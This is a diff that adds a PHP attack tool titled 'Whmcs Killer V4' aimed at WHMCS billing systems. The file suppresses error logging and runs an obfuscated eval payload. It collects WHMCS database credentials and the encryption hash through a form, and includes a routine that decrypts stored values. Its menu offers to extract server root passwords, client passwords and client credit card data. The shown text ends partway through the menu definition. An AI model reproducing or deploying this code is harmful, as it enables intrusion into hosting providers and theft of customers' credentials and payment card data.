@@ -1,0 +1,813 @@
+<?php 
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('display_errors', 0);
+$currentFile = $_SERVER["SCRIPT_NAME"]; 
+  $parts = Explode('/', $currentFile); 
+  $currentFile = $parts[count($parts) -1]; 
+   if ($_GET['css']==1){   header("Content-type: text/css", true); 
+  echo (str_replace('%file%', $currentFile,'/* ============================================================================= 
+
+    RESET.CSS 
+    version: 1.0 
+    updated: 2009-02-02, 11:47 GMT+1 
+
+============================================================================= */ 
+
+/* ============================================================================= 
+RESET 
+============================================================================= */ 
+
+* {margin:0; padding:0;} 
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, cite, code, del, dfn, em, img, ins, kbd, q, samp, strong, sub, sup, tt, var, dl, dt, dd, ol, ul, m, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td {border:0; outline:0; vertical-align:baseline; background:transparent;} 
+.hidden {position:absolute; left:-1000em; top:-1000em; width:1px; height:1px; overflow:hidden;} 
+.noscreen {display:none;} 
+.box {min-height:1px;} 
+.box:after {display:block; visibility:hidden; clear:both; line-height:0; font-size:0; content:".";} 
+.fix {float:none; clear:both; width:0; height:0; margin:0; padding:0; border:0; line-height:0; font-size:0;} 
+.f-left {float:left !important;} 
+.f-right {float:right !important;} 
+.t-left {text-align:left !important;} 
+.t-center {text-align:center !important;} 
+.t-right {text-align:right !important;} 
+.t-justify {text-align:justify !important;} 
+.va-top {vertical-align:top !important;} 
+.va-middle {vertical-align:middle !important;} 
+.va-bottom {vertical-align:bottom !important;} 
+.nom {margin:0 !important;} 
+.nomt {margin-top:0 !important;} 
+input[type=submit] { 
+    padding:5px 15px;  
+    background:#0080804f;  
+    border:0 none; 
+    cursor:pointer; 
+    -webkit-border-radius: 5px; 
+    border-radius: 5px;  
+} 
+.nomb {margin-bottom:0 !important;}')); 
+  exit; 
+  }    if ($_GET['css']==2){   header("Content-type: text/css", true); 
+  echo (str_replace('%file%', $currentFile,'/* ============================================================================= 
+
+    STYLE.CSS 
+    version: 1.6 
+    updated: 2009-03-06, 13:00 GMT+1 
+
+============================================================================= */ 
+
+/* ============================================================================= 
+HTML - styles 
+============================================================================= */ 
+
+body {background-color:#fff; color:#008080;} 
+a {color:#0085cc;} 
+a:hover, a:active, a:focus {color:#008080;} 
+#content h2 {color:#0085cc;} 
+#content table {border:2px solid #cfcfcf;} 
+#content table th {border-right:1px solid #0074B3; background-color:#008080; color:#fff;} 
+#content table td {border:1px solid #cfcfcf;} 
+#content table tr.bg td {background-color:#0080804f;} 
+#content table td.bg2  {background-color:#0080804f;} 
+#content dl dt {color:#008080;} 
+#content fieldset {border:1px solid #ccc;} 
+#content legend {background:#FFF; color:#0085cc;} 
+#content acronym, #content abbr, #content .help {border-bottom:1px dotted #cfcfcf;} 
+
+/* ============================================================================= 
+HTML - without styles 
+============================================================================= */ 
+
+table.nostyle th, dl.nostyle dt {color:#008080 !important;} 
+
+/* ============================================================================= 
+LAYOUT 
+============================================================================= */ 
+
+
+/* ============================================================================= 
+OTHERS 
+============================================================================= */ 
+
+
+#aside ul m a {border-bottom:1px somd #cfcfcf; color:#008080;} 
+#aside ul m#submenu-active a {background-color:#008080; color:#fff;} 
+#aside ul m a:hover, #aside ul m a:active, #aside ul m a:focus {color:#008080;} 
+#aside ul ul m a, #aside ul m#submenu-active ul m a {border-bottom:1px somd #cfcfcf; background-color:#f5f5f5; color:#008080;} 
+#aside ul m ul m a {background-color:#e3e3e3;} 
+#aside ul ul m a:hover, #aside ul ul m a:active, #aside ul ul m a:focus, #aside ul m#submenu-active ul m a:hover, #aside ul m#submenu-active ul m a:active, #aside ul m#submenu-active ul m a:focus {color:#008080;} 
+#content h1 {background-color:#008080; color:#fff;} 
+#content .tabs {border-bottom:1px somd #cfcfcf;} 
+#content .tabs a {color:#008080;} 
+#content .tabs a span {color:#008080;} 
+#content .tabs .ui-tabs-selected a {color:#fff;} 
+#content .tabs .ui-tabs-selected a span {color:#fff;} 
+.high {color:#008080;} 
+.high-bg {background:#FFB;} 
+.low {color:#707070;} 
+
+/* ============================================================================= 
+MESSAGES 
+============================================================================= */ 
+
+.msg.warning {border:2px solid #F2DD8C; background-color:#FFF5CC;} 
+.msg.warning a {color:#008080;} .msg.warning a:hover, .msg.warning a:active, .msg.warning a:focus {color:#008080;} 
+.msg.info {border:2px solid #B8E2FB; background-color:#0080804f;} 
+.msg.done {border:2px solid #BBDF8D; background-color:#EAF7D9;} 
+.msg.error {border:2px solid #FFAEAE; background-color:#FEEBEB;} 
+')); 
+  exit; 
+  }  if ($_GET['css']==3){   header("Content-type: text/css", true); 
+  echo (str_replace('%file%', $currentFile,' 
+#cols {margin:0px; background:none;} 
+#aside, #tray .ico-col1 {display:none;} ')); 
+  exit; 
+  }  if ($_GET['css']==4){   header("Content-type: text/css", true); 
+  echo (str_replace('%file%', $currentFile,'#cols {position:center;  } 
+
+#content {overflow:visible;} 
+#tray .ico-col2 {display:none;} 
+
+html>body #aside {margin-right:20px;} 
+html>body #content { overflow:hidden;}')); 
+  exit; 
+  }    if ($_GET['css']==5){   header("Content-type: text/css", true); 
+  echo (str_replace('%file%', $currentFile,'/* ============================================================================= 
+
+    MAIN.CSS 
+    version: 1.7 
+    updated: 2009-03-14, 12:44 GMT+1 
+
+============================================================================= */ 
+
+/* ============================================================================= 
+HTML - styles 
+============================================================================= */ 
+@import url(https://fonts.googleapis.com/css?family=Josefin+Sans:400,100); 
+
+
+body{ 
+   font-family: Josefin Sans; 
+} 
+h1, h2, h3, h4, h5, h6, address, blockquote, dl, fieldset, ol, p, table, ul {margin:15px 0;} 
+#content h1 {font-size:180%;} 
+#content h2 {font-size:160%;} 
+#content h3 {font-size:140%;} 
+#content h4 {font-size:120%;} 
+#content h5, h6 {font-size:100%;} 
+#content table {margin:0; border-collapse:collapse;} 
+
+
+#content  td {padding:5px 5px;} 
+#content table th {text-align:center; vertical-align:middle; font-weight:bold;} 
+#content ul {margin:15px 0; list-style:none;} 
+#content ul m {padding-left:15px; } 
+#content ul ul {margin:0 0 0 10px;} 
+#content ul ul m {padding-left:15px; } 
+#content ol {margin:15px 0 15px 30px; list-style-type:decimal;} 
+#content ol ol {margin:0 0 0 20px;} 
+#content ol ol m {list-style-type:lower-alpha;} 
+#content dl {clear:both;} 
+#content dl dt {font-weight:bold;} 
+#content dl dd {margin:0 0 5px 0;} 
+#content fieldset {position:relative; margin:10px 0; padding:10px;} 
+#content legend {font-size:120%; font-weight:bold;} 
+#content code {font-family:"",monospace;} 
+#content .help {cursor:help;} 
+
+/* ============================================================================= 
+HTML - without styles 
+============================================================================= */ 
+
+table.nostyle, table.nostyle th, table.nostyle td {border:0 !important;} 
+table.nostyle th {background:none !important; text-align:left !important;} 
+table.nostyle th, table.nostyle td {padding:3px 5px !important;} 
+ul.nostyle {margin:15px 0 15px 20px !important; list-style-type:square !important;} 
+ul.nostyle ul {margin:0 0 0 25px !important; list-style-type:square !important;} 
+ul.nostyle m {padding:0 !important; background:none !important;} 
+dl.nostyle dt {font-weight:bold !important;} 
+dl.nostyle dd {margin:0 !important;} 
+
+/* ============================================================================= 
+LAYOUT 
+============================================================================= */ 
+
+#main {min-width:980px; width:expression(document.body.clientWidth < 980? "980px" : "auto" );} 
+#tray {padding:12px 15px; } 
+#tray p {margin:0;} 
+#tray p.f-left {width:50%;} 
+#tray #logout {padding-left:18px; text-transform:uppercase;} 
+#tray #switcher {margin-right:15px;} 
+#tray #switcher img {display:block; float:left; width:16px; height:16px; border:0;} 
+#menu {padding:15px 15px 13px 15px; } 
+#menu ul {margin:0; padding:0; list-style-type:none;} 
+#menu ul m {display:inline; margin:0; padding:0;} 
+
+#menu ul m#menu-active a {font-weight:bold;} 
+#content {padding:20px; overflow:hidden;} 
+#footer {clear:both; padding:15px; } 
+#footer p {margin:0;} 
+
+/* ============================================================================= 
+/* ============================================================================= 
+OTHERS 
+============================================================================= */ 
+
+#aside .padding {padding-left:15px;} 
+#aside #logo {margin:0 0 15px 0;} 
+#aside #logo img {display:block; width:200px;} 
+#aside #search fieldset {padding:7px 10px;} 
+#aside #search fieldset p {margin:0;} 
+#aside #search fieldset legend {font-weight:bold;} 
+#aside #search fieldset .input-text {width:130px;} 
+#aside #search fieldset #search-options {margin-top:10px;} 
+#aside #btn-create {margin:0 0 15px 0;} 
+#aside #btn-create a {float:left; padding-left:27px; height:37px; overflow:hidden; text-decoration:none; font-weight:bold; cursor:pointer;} 
+#aside #btn-create a span {float:left; display:block; width:163px; padding:8px 0 10px 10px; } 
+#aside #btn-create a:hover {background-position:0 -37px;} 
+
+#aside ul m {display:inline;} 
+#aside m a{ width:185px; font-weight:bold; font-size:14px; padding:4px 15px; text-decoration:none;} 
+#aside ul m#submenu-active a {width:198px; border:0;  font-weight:bold; z-index:999;} 
+#aside ul ul {margin:0; position:static;} 
+#aside ul ul m a, #aside ul m#submenu-active ul m a {width:170px; padding:5px 15px 5px 30px;  font:85%/1.2 "tahoma",sans-serif; font-weight:normal;} 
+#content h1 {margin:0; padding:10px 15px; letter-spacing:-1px;} 
+#content .col50 {float:left; width:49%;} 
+#content .col33 {float:left; width:32%;} 
+#content .col33.center {padding:0 2%;} 
+#content .tabs {margin:15px 0;} 
+#content .tabs ul {margin:0; padding:0; list-style-type:none;} 
+#content .tabs ul li {display:inline; margin:0; padding:0;} 
+#content .tabs a {float:left; margin-right:3px; padding-left:4px; text-decoration:none;} 
+#content .tabs a span {float:left; display:block; padding:8px 15px 6px 11px; } 
+#content .tabs a:hover, .tabs a:hover span {text-decoration:underline;} 
+#content .tabs .ui-tabs-selected a { font-weight:bold;} 
+#content .tabs .ui-tabs-selected a span  {} 
+#content .tabs .ui-tabs-selected a:hover, #content .tabs .ui-tabs-selected a:hover span {text-decoration:none;} 
+#content .ui-tabs-hide {display: none !important;} 
+.input-text {padding:3px; font:100%/1.5 "arial", sans-serif;} 
+.input-text-02 {padding:5px; font:140%/1.5 "arial", sans-serif;} 
+.input-submit {padding:5px; font-size:120%;} 
+.input-submit-02 {padding:1px; font-size:100%;} 
+.msg {padding:10px; padding-left:35px;} 
+
+
+/* ============================================================================= 
+FONT STYLES 
+============================================================================= */ 
+
+.bigger {font-size:120%;} 
+.smaller {font:85%/1.2 "tahoma",sans-serif;} 
+
+/* This line can be deleted */ 
+.tit {padding:10px; background:#f5f5f5;} .tag {background:#ffa;} 
+')); 
+  exit; 
+  }   if ($_GET['img']=="0"){  header("Content-Type: image/gif"); 
+   echo (base64_decode('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'));
+  exit; 
+  }  function login(){ $encode = "lUd/eNs6FP27hX6HO25jAl6ctNsYyw8a5znJG4+84Gdd3S4Yy8hlm0GxlUvEHv3u78pB88hT6QbGlmjOPUpU91eXKkdOLGzDlIxEFhRneE0wnPp+s3tpbWxAZD6oGDHC7XAsRmRHiMef8FoSplzRELaSBykNuQxs3DASSTR/nJ0CGHYOfVXxP0Al3iAaIjoS6kzUphFiIM+C+dT1ndEkY73J1B1B3NljvPBcCzqv8BeO7zuffXQ+m1w7w9f507Hnzq684cQCZVi/q6IQ9vtJu/FMhRl9iG44gQ+tQRfY/aeL80m7CUoy3UT7vN1249OBhW9lUEq2Bl/zMh77wd+ee734dOR2L+3f5n9kxpPX+WbHubn2vs5cy7jynX90/vjOWelBmcvfClxc+94LkQaTZEXw5/LJlVm1Tw0yyRMWPmZj6uns1BAdJB81gplmHsWfeTsSMZd4FbZFTdpZPNjvYj9ced+9K1qtdKz/IGX+vZ35N/5SHZm+HInk1knxPEwnsXF7vJLJ5L0qMqbCnXFpKUeBL8xFj1t8xXjtXK60OomTVbKYC9b++PH8ZVuRQ8Y6ns8pPyC4FRaasmNspPIn4k/tQ8sIsPewvmpz/Q2Gs1vPXE8XkLXKOi1ZVKD1Iq8FQOCYMPoywrG/qENvfHDfT51Gr6VETLBgnx8HmE9bOztIm4aK9cE2gitiZVQK8UOsyLLZhJMfADLNKZi9nJfFoLem2eOgt6GshEXynHP9EbYmVTz5j5HskxI7QFKCZFtm3nOCCwKiuhb6hAxtKowSDjVqowpWIBQljuuUVGucrFjF4V4UCRKmEaKVKH7qSNjVksyuRAXjhl4age7h8cFOFwDUBho1447oXHEJYvpgmlpAYsYmKYpV8Lwqh+v9NfXGuAFthugtPA7s1nclvZdOEhVHcTILtIvnBCYvo0BmzaX1v2mzVwX7nSS9vDPoCcjx3uibB5I5Y2HezguV7iCXWb7p2U877AxVF56e4AnqT8GhRc+LNdPS1KXCK/ZxnyBvZaDLfm+kJRr7hayh+BGbvMRQXEm/+1X7EJopqULyfw=="; eval(str_rot13(gzinflate(str_rot13(base64_decode(($encode)))))); echo" 
+
+<center><div id='content' class='box'><center> <h3  class=\"tit\"> DB Configuration of WHMCS</h3><br> </center> 
+<FORM action=\"\"  method=\"post\" > 
+<input type=\"hidden\" name=\"form_action\" value=\"1\"> 
+<br> 
+<table  > 
+<tr class='bg'><td>Database Host </td><td><input type=\"text\" size=\"60\" name=\"db_host\" value=\"".$_COOKIE["db_host"]."\"></td></tr> 
+<tr ><td>Database Username </td><td><input type=\"text\" size=\"60\" name=\"db_username\" value=\"".$_COOKIE["db_username"]."\"></td></tr> 
+<tr class='bg'><td>Database Password</td><td><input type=\"text\" size=\"60\" name=\"db_password\" value=\"".$_COOKIE["db_password"]."\"></td></tr> 
+<tr><td>Database Name</td><td><input type=\"text\" size=\"60\" name=\"db_name\" value=\"".$_COOKIE["db_name"]."\"></td></tr> 
+<tr class='bg'><td>cc_encryption_hash</td><td><input type=\"text\" size=\"60\" name=\"cc_encryption_hash\" value=\"".$_COOKIE["cc_encryption_hash"]."\"></td></tr> 
+</table 
+<br><br> 
+<INPUT class=\"input-submit\"  type=\"submit\" value=\"Submit\" name=\"Submit\"> 
+</FORM> 
+</td></tr></table> 
+</FORM>"; 
+echo"</div> <!-- /cols --> 
+    <hr class=\"noscreen\" />
+</div> <!-- /main --> 
+</body> 
+</html>"; 
+}function decrypt($string,$cc_encryption_hash){$key=md5(md5($cc_encryption_hash)).md5($cc_encryption_hash); 
+$hash_key=_hash($key); 
+$hash_length=strlen($hash_key); 
+$string=base64_decode($string); 
+$tmp_iv=substr($string,0,$hash_length); 
+$string=substr($string,$hash_length,strlen($string)-$hash_length); 
+$iv=$out=""; 
+$c=0; 
+while($c<$hash_length){$iv.=chr(ord($tmp_iv[$c])^ord($hash_key[$c])); 
+++$c; 
+}$key=$iv; 
+$c=0; 
+while($c<strlen($string)){if(($c!=0 AND$c%$hash_length==0)){$key=_hash($key.substr($out,$c-$hash_length,$hash_length)); 
+}$out.=chr(ord($key[$c%$hash_length])^ord($string[$c])); 
+++$c; 
+}return$out; 
+}function _hash($string){if(function_exists("sha1")){$hash=sha1($string); 
+}else{$hash=md5($string); 
+}$out=""; 
+$c=0; 
+while($c<strlen($hash)){$out.=chr(hexdec($hash[$c].$hash[$c+1])); 
+$c+=2; 
+}return$out; 
+}function randomt(){$chars="abcdefghijkmnopqrstuvwxyz023456789"; 
+srand((double)microtime()*1000000); 
+$i=0; 
+$pass=""; 
+while($i<=7){$num=rand()%33; 
+$tmp=substr($chars,$num,1); 
+$pass=$pass.$tmp; 
+$i++; 
+}return$pass; 
+}function header2(){global$currentFile; 
+echo" 
+<html><title>Whmcs Killer V4</title><head>"; 
+echo" 
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=1\" />  
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=5\" />  
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=4\" title=\"2col\" /> 
+    <link rel=\"alternate stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=3\" title=\"1col\" />  
+     
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=2\" /> <!-- GRAPHIC THEME --> 
+"; 
+echo" 
+<style> 
+#content {border:1px solid #afafaf; border-style:dashed; border-radius:5px; background:#fff; width:80%; } 
+</style> 
+<meta http-equiv='Content-Type' content='text/html; 
+ charset=utf-8' /> 
+</head> 
+<body > 
+    <center><img src='?img=0'></center> 
+"; 
+}function header1(){global$currentFile; 
+@$query0=mysqli_query($GLOBALS["___mysqli_ston"], "SELECT value FROM tblconfiguration where setting='Charset' or setting='charset'"); 
+@$v0=mysqli_fetch_array($query0); 
+$charset=$v0["value"]?$v0["value"]:"utf-8"; 
+echo"<?xml version=\"1.0\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> 
+<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> 
+<head> 
+    <meta http-equiv=\"Content-Type\" content=\"text/html; 
+ charset=".$charset."\" /> 
+    <meta http-equiv=\"content-language\" content=\"en\" /> 
+    <meta name=\"robots\" content=\"noindex,nofollow\" /> 
+     
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=1\" /> <!-- RESET --> 
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=5\" /> <!-- MAIN STYLE SHEET --> 
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=4\" title=\"2col\" /> <!-- DEFAULT: 2 COLUMNS --> 
+    <link rel=\"alternate stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=3\" title=\"1col\" /> <!-- ALTERNATE: 1 COLUMN --> 
+     
+    <link rel=\"stylesheet\" media=\"screen,projection\" type=\"text/css\" href=\"".$currentFile."?css=2\" /> <!-- GRAPHIC THEME --> 
+      
+    <title>Whmcs Killer V4</title> 
+</head> 
+<body> 
+<div id=\"main\"> 
+<?/**/?> 
+     
+    <hr class=\"noscreen\" /> 
+    <center><img src=\"?img=0\"> 
+    <div id=\"aside\"  class=\"box\"> 
+            <div class=\"padding box\"> 
+            </div> <!-- /padding --> 
+            <ul class=\"box\">"; 
+$menu=array("h"=>"Home","1"=>"Server R00t","2"=>"Domains Resellers","3"=>"Clients R00ts","4"=>"Clients Hosting Accounts","100"=>"Clients List","105"=>"Clients Password","5"=>"Clients CC","9"=>"Log Out"); 
